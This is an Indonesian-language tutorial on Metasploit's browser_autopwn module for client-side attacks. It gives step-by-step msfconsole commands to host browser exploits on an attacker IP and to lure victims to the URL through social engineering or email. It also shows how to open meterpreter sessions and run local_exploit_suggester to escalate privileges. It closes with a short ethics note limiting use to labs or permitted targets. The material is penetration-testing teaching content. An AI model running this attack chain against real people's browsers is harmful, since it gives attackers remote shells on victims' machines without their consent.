# Eksploitasi Otomatis dengan AutoPwn 

## A. Apa itu AutoPwn?

AutoPwn adalah fitur dari Metasploit yang secara otomatis memuat berbagai eksploit dan menyerang target berdasarkan kerentanannya, terutama melalui browser (client-side attack).

Modul terkait:

```
auxiliary/server/browser_autopwn
```

> Fitur ini sudah deprecated dalam versi baru, tetapi konsepnya masih digunakan dalam serangan berbasis exploit suggestion + exploit chaining.

Prasyarat:
- Kali Linux dengan Metasploit terinstal.
- Browser korban (misalnya `Windows 7` + `IE`, `Firefox` versi lama).
- Jaringan lokal/lab untuk pengujian.
- Pengetahuan dasar Metasploit.

### 1. Setup AutoPwn

1. Jalankan Metasploit

   ```
   msfconsole
   ```

2. Gunakan modul AutoPwn:

   ```
   use auxiliary/server/browser_autopwn
   ```

3. Atur parameter penting:

   ```
   set LHOST 192.168.1.10
   set SRVHOST 192.168.1.10
   set SRVPORT 80
   set SSL false
   set verbose true
   ```

   Keterangan:
   - `LHOST`: IP Attacker
   - `SRVHOST`:  IP hosting payload
   - `SRVPORT`: Port hosting payload
   - `SSL`: Non-SSL (HTTP)
   - `VERBOSE`: Menampilkan output lebih detail (debugging)
  
4. Jalankan:

   ```
   run
   ```

   Metasploit akan:
   - Menjalankan web server dengan banyak exploit browser.
   - Membuat payload otomatis.
   - Menunggu korban mengakses URL (via social `engineering`, `email`, `dsb`).
   - Menyuntikkan exploit dan mencoba men-deploy payload.
  
### 2. Teknik Penyebaran

   Kirim URL ke korban: http://192.168.1.100/

   - Jika browser rentan (`IE6`, `Firefox 10`, `dll`), exploit akan dikirim.
   - Otomatis membuka sesi meterpreter.

### 3. Hasil Eksploitasi

   Cek sesi:

   ```
   sessions -l
   ```

   Interaksi:

   ```
   sessions -i 1
   ```
### 4. Alternatif: Auto Exploitation dengan Exploit Suggestion

   Langkah:

   ```
   use post/multi/recon/local_exploit_suggester
   set SESSION 1
   run
   ```
 
   Kemudian gunakan exploit yang disarankan:

   ```
   use exploit/linux/local/xxx
   set SESSION 1
   run
   ```

## Catatan Etis dan Legal
   - AutoPwn hanya boleh digunakan dalam lab atau lingkungan izin.
   - Jangan digunakan terhadap sistem publik atau tanpa persetujuan.
   - Risiko legal dan etika sangat tinggi jika digunakan sembarangan.

